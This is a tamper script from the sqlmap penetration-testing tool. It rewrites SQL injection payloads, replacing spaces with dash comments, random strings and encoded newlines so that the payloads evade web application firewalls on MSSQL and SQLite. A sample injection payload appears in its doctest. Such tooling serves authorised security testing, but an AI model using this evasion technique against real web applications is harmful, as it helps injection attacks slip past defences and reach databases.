#!/usr/bin/env python

"""
Copyright (c) 2006-2021 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import random
import string

from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def tamper(payload, **kwargs):
    """
    Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n')

    Requirement:
        * MSSQL
        * SQLite

    Notes:
        * Useful to bypass several web application firewalls
        * Used during the ZeroNights SQL injection challenge,
          https://proton.onsec.ru/contest/

    >>> random.seed(0)
    >>> tamper('1 AND 9227=9227')
    '1--upgPydUzKpMX%0AAND--RcDKhIr%0A9227=9227'
    """

    retVal = ""

    if payload:
        for i in xrange(len(payload)):
            if payload[i].isspace():
                randomStr = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))
                retVal += "--%s%%0A" % randomStr
            elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                retVal += payload[i:]
                break
            else:
                retVal += payload[i]

    return retVal
